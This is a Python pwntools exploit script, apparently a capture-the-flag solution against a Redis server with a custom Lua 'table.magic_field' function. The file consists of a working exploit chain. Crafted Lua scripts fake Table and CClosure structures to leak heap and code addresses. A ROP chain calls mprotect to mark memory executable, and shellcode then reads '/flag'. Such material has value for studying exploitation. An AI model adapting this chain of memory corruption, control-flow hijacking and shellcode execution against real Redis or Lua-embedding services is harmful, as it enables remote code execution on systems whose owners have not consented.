from redis import Redis
import redis 
import sys
from pwn import *
import threading
dummy_node_offset = 0x32a160
tb_Table = 0
fake_Table = 0
code_base = 0
fake_CClosure = 0
shellcode_addr = 0
#elf = ELF("./redis-server")

def int642double(num):
    p = struct.pack("Q", num)
    up = struct.unpack("<d", p)
    return up[0]

def double2int64(num):
    p = struct.pack("<d", num)
    up = struct.unpack("Q", p)
    return up[0]

def bytes_to_lua_stringchar(data):
    if not data:
        return "string.char()"
    hex_value = ', '.join(f'0x{byte:02X}' for byte in data)
    return f'string.char({hex_value})'

def craft_Table( next_ptr=0, tt=0x05, marked=0, flags=0, readonly=0, lsizenode=0, metatable_ptr=0, array_ptr=0, node_ptr=0, lastfree_ptr=0, gclist_ptr=0, sizearray=0):
    """
    struct Table {
        GCObject *next;
        lu_byte tt;
        lu_byte marked;
        lu_byte flags;
        int readonly;
        lu_byte lsizenode;
        struct Table *metatable;
        TValue *array;
        Node *node;
        Node *lastfree;
        GCObject *gclist;
        int sizearray;
    }
    """
    fmt = "@QBBBiBQQQQQi"
    data = struct.pack(fmt, next_ptr, tt, marked, flags, readonly, lsizenode,
                metatable_ptr, array_ptr, node_ptr, lastfree_ptr, 
                gclist_ptr, sizearray)
    return data

def craft_CClosure(next_addr, func_addr):
    """
    struct CClosure {
        GCObject *next;
        lu_byte tt;
        lu_byte marked;
        lu_byte isC;
        lu_byte nupvalues;
        GCObject *gclist;
        Table *env;
        lua_CFunction f;
        Tvalue upvalue[1];
    }
    """
    fmt = "@QBBBBQQQQi"
    data = struct.pack(fmt, next_addr, 6, 0, 1, 0, 0, 0, func_addr, 0, 0)
    return data


def clean(r):
    # This reset the jemalloc tcache being used, which is very useful for consistent bin addressing.
    r.script_flush('SYNC')
    print('[+] Clean all complate')

def craft_leak1():
    script = """
local tb = {}
tb[1] = tb
for i = 1, 6 do
    table.magic_field(tb, 1)
end
return tostring(tb[1])
    """
    return script

def craft_leak2():
    payload = craft_Table(array_ptr=tb_Table+0x28, sizearray=2)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_leak3():
    script = f"""
local tb = {{}}
tb[1] = {int642double(fake_Table)}
for i = 1, 2 do
    table.magic_field(tb, 1)
end

for i = 1, 3 do
    table.magic_field(tb[1], 1)
end
local a = tostring(tb[1][1])
return a
    """
    return script

gad = [
    0x000000000021cf69, # mov rax, qword ptr [rax]; call qword ptr [rax + 0x20];
    0x00000000001420ad, # push rax; add al, 0; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret;
    0x0000000000084cd2, # pop rdi; ret;
    0x0000000000088de1, # pop rsi; ret;
    0x00000000000cd5df, # pop rdx; ret;
    0x83DF0 # mprotect
]
def craft_hijack0():
    payload = b""
    payload+= p64(gad[2]) + p64(0)
    payload+= p64(gad[2]) + p64(gad[1])
    payload+= p64(gad[2]) + p64(shellcode_addr&(~0xfff))
    payload+= p64(gad[3]) + p64(0x2000)
    payload+= p64(gad[4]) + p64(7)
    payload+= p64(gad[5]) + p64(shellcode_addr)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_hijack1():
    payload = craft_CClosure(fake_stack-8, gad[0]) + p32(0)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_hijack2():
    context.arch = "amd64"
    sc = shellcraft.open('/flag')
    sc+= shellcraft.read('rax', 'rsp', 0x100)
    sc+= shellcraft.write(12, 'rsp', 'rax')
    payload = asm(sc)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_hijack3():
    script = f"""
local tb = {{}}
tb[1] = {int642double(fake_CClosure)}
for i = 1, 3 do
    table.magic_field(tb, 1)
end
tb[1]()
    """
    return script

def get_flag(host, port):
    p = remote(host, port)
    print(p.recvline())

def main():
    global tb_Table 
    global fake_Table
    global code_base
    global fake_CClosure
    global gad
    global shellcode_addr
    global fake_stack
    host = "127.0.0.1"
    port = 8888
    th = threading.Thread(target=get_flag, args=(host, port, ))
    th.start()
    sleep(1)

    r = Redis(host=host, port=port, socket_timeout=2, socket_connect_timeout=2)
    flag = 0
    try:
        clean(r)
        script = craft_leak1()
        leak = r.eval(script, 0)
        leak = float(leak)
        tb_Table = double2int64(leak)&(~0xf)
        print(f"[+] tb_Table: {hex(tb_Table)}")

        script = craft_leak2()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        fake_Table = (double2int64(leak)&(~0xf)) + 0x18
        print(f"[+] fake_Table: {hex(fake_Table)}")

        script = craft_leak3()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        code_base = (double2int64(leak)&(~0xf)) - dummy_node_offset
        print(f"[+] code_base: {hex(code_base)}")

        for i in range(len(gad)):
            gad[i]+= code_base

        script = craft_hijack2()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        shellcode_addr = (double2int64(leak)&(~0xf)) + 0x28
        print(f"[+] shellcode_addr: {hex(shellcode_addr)}")

        script = craft_hijack0()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        fake_stack = (double2int64(leak)&(~0xf)) + 0x18
        print(f"[+] fake_stack: {hex(fake_stack)}")

        script = craft_hijack1()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        fake_CClosure = (double2int64(leak)&(~0xf)) + 0x18
        print(f"[+] fake_CClosure: {hex(fake_CClosure)}")
        
        
        script = craft_hijack3()
        leak = r.eval(script, 0)
    except Exception as e:
        print("[!] over")
    
if __name__ == "__main__":
    main()
